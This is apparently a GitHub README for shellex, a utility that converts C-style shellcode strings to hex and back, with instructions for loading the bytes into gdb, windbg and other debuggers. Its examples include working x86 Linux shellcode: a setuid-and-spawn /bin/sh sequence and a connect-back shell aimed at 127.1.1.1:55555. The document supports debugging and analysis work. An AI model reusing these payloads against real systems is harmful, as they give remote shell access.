# shellex
**WARNING**: the ugliest code in the world

C-shellcode to hex converter. 

Handy tool for paste & execute shellcodes in gdb, windbg, ollydbg, x64dbg and immunity debugger.

Are you having problems converting C-shellcodes to HEX (maybe c-comments+ASCII mixed?) 

Here is shellex. If the shellcode can be compiled in a C compiler shellex can convert it.

Just execute shellex, paste the shellcode c-string and press ENTER. 

To end use Control+Z(Windows)/Control+D(Linux)

Converting c-shellcode-multi-line-hex+mixed_ascii (pay attention in the mixed part **\x68//sh\x68/bin\x89**):
```
"\x6a\x17\x58\x31\xdb\xcd\x80"
"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
```

shellex output:
```
6A 17 58 31 DB CD 80 6A 0B 58 99 52 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 52 53 89 E1 CD 80
```

Now you can copy the output & paste it to Immunity Debugger, ollydbg, x64dbg, 010 hexadecimal editor etc.

Converting c-shellcode-multi-line-with-comments:
```
"\x68"
"\x7f\x01\x01\x01"  // <- IP:  127.1.1.1
"\x5e\x66\x68"
"\xd9\x03"          // <- Port: 55555
"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
"\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
"\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
"\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
"\xeb\xce"
```

shellex output:
```
68 7F 01 01 01 5E 66 68 D9 03 5F 6A 66 58 99 6A 01 5B 52 53 6A 02 89 E1 CD 80 93 59 B0 3F CD 80 49 79 F9 B0 66 56 66 57 66 6A 02 89 E1 6A 10 51 53 89 E1 CD 80 B0 0B 52 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 52 53 EB CE
```

Do you need the shellex output as a new c-shellcode-string? just use -h parameter, example converting the shellex output:
```
./shellex -h 6A 17 58 31 DB CD 80 6A 0B 58 99 52 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 52 53 89 E1 CD 80

\x6A\x17\x58\x31\xDB\xCD\x80\x6A\x0B\x58\x99\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x52\x53\x89\xE1\xCD\x80
```

## Installation

```
git clone https://github.com/David-Reguera-Garcia-Dreg/shellex.git
```

### For Windows:

binary: shellex\bins\shellex.exe

### For Linux

Deps:

```
sudo apt-get install tcc
```

binary: shellex/linuxbins/shellex

## Paste & Execute shellcode in ollydbg, x64dbg, immunity debugger

Just use my xshellex plugin:

https://github.com/David-Reguera-Garcia-Dreg/xshellex

## Paste & Execute shellcode in gdb 

* execute shellex 
* enter the shellcode:
```
"\x6a\x17\x58\x31\xdb\xcd\x80"
"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
```
* press enter
* press Control+D
* convert the shellex output to C-Hex-String with shellex -h:
```
shellex -h 6A 17 58 31 DB CD 80 6A 0B 58 99 52 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 52 53 89 E1 CD 80
```
* write the C-Hex-String to a file as raw binary data with "echo":
```
echo -n "\x6A\x17\x58\x31\xDB\xCD\x80\x6A\x0B\x58\x99\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x52\x53\x89\xE1\xCD\x80" > /tmp/sc
```
* gdb /bin/ls
* starti

Write the binary file to the current instruction pointer:

for 32 bits:
```
restore /tmp/sc binary $eip
x/30b $eip
x/15i $eip
```

for 64 bits:
```
restore /tmp/sc binary $rip
x/30b $rip
x/15i $rip
```

Done! You can debug the shellcode

Notes:

x/30b is the size in bytes of the shellcode, you can get the size with: 
```
wc -c /tmp/sc
```

x/15i is the number of instructions to display, you can get the size with:
```
sudo apt-get install nasm
```

For 32 bits:
```
ndisasm -b32 /tmp/sc
ndisasm -b32 /tmp/sc | wc -l
```

For 64 bits:
```
ndisasm -b64 /tmp/sc
ndisasm -b64 /tmp/sc | wc -l
```

## Paste & Execute shellcode in windbg

* execute shellex 
* enter the shellcode:
```
"\x6a\x17\x58\x31\xdb\xcd\x80"
"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
```
* press enter
* press Control+D
* convert the shellex output to raw binary data with certutil:
```
echo 6A 17 58 31 DB CD 80 6A 0B 58 99 52 68 2F 2F 73 68 68 2F 62 69 6E 89 E3 52 53 89 E1 CD 80 > C:\Users\Dreg\sc.hex
certutil -f -decodeHex c:\Users\Dreg\sc.hex c:\Users\Dreg\sc
del C:\Users\Dreg\sc.hex
```

certutil output:
```
Input Length = 92
Output Length = 30
CertUtil: -decodehex command completed successfully.
```

The lenght of our shellcode is 30, then use L0n30 in windbg. 

Write the binary file to the current instruction pointer:

for 32 bits:
```
.readmem C:\Users\Dreg\sc @eip L0n30
```

for 64 bits:
```
.readmem C:\Users\Dreg\sc @rip L0n30
```

Done! You can debug the shellcode

## Compilation

For Windows just use Visual Studio 2013
* https://my.visualstudio.com/Downloads?q=visual%20studio%202013&wt.mc_id=o~msft~vscom~older-downloads
* https://go.microsoft.com/fwlink/?LinkId=532495&clcid=0x409

For Linux just: 
```
cd shellex/shellex
gcc -o shellex shellex.c
./shellex
```


